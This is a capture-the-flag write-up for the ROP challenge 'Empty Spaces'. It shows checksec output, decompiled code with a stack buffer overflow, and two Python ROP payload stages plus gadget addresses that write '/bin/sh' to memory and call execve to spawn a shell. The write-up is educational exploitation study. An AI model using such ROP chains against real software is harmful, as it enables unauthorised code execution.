# Empty Spaces

**Category:** ROP

## Overview

```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

```text
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buffer[64]; // [rsp+10h] [rbp-40h] BYREF

  IO_setvbuf(stdin, 0, 2, 0);
  IO_setvbuf(stdout, 0, 2, 0);
  IO_puts("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?");
  _libc_read(0, buffer, 137);
  empty(buffer);
  return 0;
}
```

```text
void __cdecl empty(char *buffer)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; i <= 17; i += 4 )
    *(_DWORD *)&buffer[4 * i] = '\xC3\xF4\x89H';
}
```

We can see that there is a buffer overflow in buffer because the size is 64 but the read length is 137.
The stack is non executable, there is no win function, so we have to use ROP.
The `empty` function implements a cleaning routine for the buffer because the data inside are overwritten.

## Analysis
To exploit this challenge we can split the payload into two parts:
1. Used to save `/bin/sh\x00` in memory in a space found using vmmap.
2. Once we have `/bin/sh\x00` in memory we can call the execve to pop a shell.

Note that in this way, our exploit is not affected by the `empty` function.

## Vulnerability
Buffer overflow in buffer

## Exploitation

Save `/bin/sh\x00` in memory:

```python
payload1 = b"A"*72
payload1 += p64(addr_pop_rsi)
payload1 += p64(addr_buffer)
payload1 += p64(addr_pop_rdi)
payload1 += p64(0)
payload1 += p64(addr_syscallret) #syscall for the read
payload1 += p64(addr_reenter_main) #return address of the read -> restarts the main
```

Now the execve call:

```python
payload2 = b"A"*72
payload2 += p64(addr_xchng)
payload2 += p64(addr_pop_rax)
payload2 += p64(0x3b)
payload2 += p64(addr_pop_rsi)
payload2 += p64(0)
payload2 += p64(addr_pop_rdi)
payload2 += p64(addr_buffer)
payload2 += p64(addr_syscall)
```


Gadgets (some are not used):

```python
added_by_empty = 0xc3f48948
addr_read = 0x419630
addr_reenter_main = 0x401922
addr_buffer = 0x4aa310
addr_pop_rsi = 0x477d3d #pop rsi; ret; 
addr_pop_rdi = 0x4787b3 #pop rdi; ret;
addr_pop_rax = 0x42146b #pop rax; ret;
addr_pop_rdx = 0x45db53 #pop rdx; leave; ret;
addr_syscall = 0x401324
addr_ret = 0x44546b
addr_syscallret = 0x40ba76 #syscall; ret;
addr_pop_rbx = 0x471a37 #pop rbx; ret;
addr_xor_edx = 0x455938 #xor edx, edx; call rax; 

addr_xchng = 0x40262d #xchg edx, eax; xor eax, eax; ret; 
```




 

